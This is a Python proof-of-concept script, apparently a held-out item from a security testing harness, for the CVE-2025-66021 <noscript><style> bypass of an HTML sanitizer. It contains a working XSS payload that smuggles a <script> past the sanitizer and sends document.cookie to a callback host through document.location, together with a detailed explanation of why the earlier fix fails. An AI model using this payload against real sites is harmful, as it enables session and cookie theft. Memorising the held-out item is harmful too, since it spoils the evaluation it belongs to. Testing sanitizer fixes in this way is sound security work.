#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-66021 residual -- the <noscript><style> scripting-desync sanitization bypass
that bypasses the CVE-2021-42575 (20211018.2) style-content fix.

Same sink (`PolicyFactory.sanitize(input)` over allowElements(...noscript,style).allowTextIn("style")),
same exfil channel as the seed. The 20211018.2 fix (commit be33ec6) only made <style> text safe by
wrapping it in `/*<![CDATA[<!--*/ ... /*-->]]>*/` and dropping content containing
`<![CDATA[`/`]]>`/`<!--`/`-->`. It did NOT account for <style> nested inside <noscript>: with the
policy allowing `noscript` + `style` + `allowTextIn("style")` (the exact CVE-2025-66021 precondition
in GHSA-g9gq-3pfx-2gw2), the payload

    <noscript><style></noscript><script>...</script>

has a `<style>` whose rawtext (no `</style>`) swallows `</noscript><script>...`. V1 emits
    <noscript><style>/*<![CDATA[<!--*/\n</noscript><script>...</script>\n/*-->]]>*/</style></noscript>

Scripting-ENABLED browser: <noscript> content is parsed as RAWTEXT until the FIRST literal
`</noscript>` -- the smuggled one -- which closes the noscript; the trailing `<script>...</script>` is
then parsed as a LIVE element -> executes on load -> reads document.cookie -> flag exfiltrated. The
wrapper's `<!--` is trapped inside the noscript rawtext and never becomes an HTML comment, so the
20211018.2 style fix is INCOMPLETE for this sibling context -> INCOMPLETE FIX.

On V2 (20260101.1, the CVE-2025-66021 fix, commit 4149cf0) the sanitizer detects and strips tag-like
content (`<script>`, `</noscript>`, even `< script>`) from `allowTextIn("style")` text, so no literal
`</noscript>` survives in the output; the browser keeps the whole tail as noscript rawtext ->
nothing executes -> BLOCKED. (Payload adapted from the upstream CVE-2025-66021 advisory PoC
`<noscript><style></noscript><script>alert(1)</script>`.)
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# The CVE-2025-66021 advisory PoC, benign-canary variant: the <script> smuggled past the style CDATA
# wrapper via the <noscript> rawtext desync reads document.cookie -> internal callback.
BYPASS_PAYLOAD = (
    "<noscript><style></noscript><script>"
    "document.location='" + CB + "'+document.cookie"
    "</script>"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 <noscript><style> scripting-desync residual on `version`; return the callback
    dump (flag on V1)."""
    return run_payload(BYPASS_PAYLOAD, version, mode="load")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
